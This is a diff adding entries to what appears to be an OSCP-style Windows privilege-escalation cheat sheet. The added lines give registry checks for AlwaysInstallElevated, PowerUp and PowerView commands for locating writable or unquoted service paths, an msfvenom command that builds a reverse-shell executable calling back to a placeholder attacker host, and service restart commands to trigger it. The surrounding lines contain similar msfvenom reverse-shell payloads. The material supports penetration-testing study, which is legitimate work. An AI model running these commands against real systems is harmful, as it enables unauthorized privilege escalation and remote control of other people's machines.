@@ -48,6 +48,16 @@ If powerup shows up:
 ```
 AlwaysInstallElevated: Enabled
 ```
+Check them to make sure
+```
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+```
+If both show up as this:
+```
+AlwaysInstallElevated REG_DWORD 0x1
+```
+
 Then we can make a msi exploit for it:
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > shell.msi
@@ -92,7 +102,35 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe > bac
 ```
 Then, after sharing it, run it, and check the shell.
 
+## Writeable Service/Unqouted Path/Modify Service
+
+```
+Get-ModifiableService
+
+```
+Or in powerview:
+```
+Get-ServiceUnquoted
+```
+```
+ModifiableServiceFile
+
+FilePermissions : Everyone [WriteData]
+Path            : C:\Program Files\App\service.exe
+```
+
+Then make an msfvenom:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
+```
+```
+sc stop VulnService
+sc start VulnService
+```
+
+
 ## Links
 
 I go over a lot more tactics here in this blog post:
+
 https://medium.com/@aaronashley466/oscp-notes-windows-privesc-cheatsheet-1c71a792f545?postPublishedType=repub
